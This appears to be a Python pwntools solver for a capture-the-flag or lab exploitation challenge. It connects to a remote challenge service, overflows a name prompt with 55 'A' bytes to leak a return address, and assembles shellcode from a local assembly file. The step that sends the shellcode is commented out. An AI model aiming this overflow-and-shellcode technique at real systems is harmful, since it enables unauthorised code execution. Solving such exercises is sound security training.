from pwn import asm, remote


def solve(r: remote, data: bytes):
    msg = r.recvuntil(b"What's your name? ").decode()
    print(msg)

    # leak the return address
    r.sendline(b"A" * 55)
    ret_addr = r.recvlinesb(2)[1]
    print(f"Original return address: {ret_addr}")
    # ret_addr = r.recvuntil(b"\nWhat's the room number? ", drop=True)
    # print(ret_addr)

    r.interactive()

    # r.sendline(b"A")
    # r.sendline(b"A")

    # msg = r.recvuntil(b"Leave your message: ").decode()
    # print(msg)

    # r.sendline(data)

    # msg = r.recvuntil(b"}").decode()
    # print(msg)

    # r.close()


if __name__ == "__main__":
    with open("./chal_1.asm") as f:
        content = f.read()

    data = asm(content, arch="amd64", os="linux")
    print("Length of the shellcode: ", len(data))

    ## for remote access
    r = remote("up.zoolab.org", 12342)
    solve(r, data)
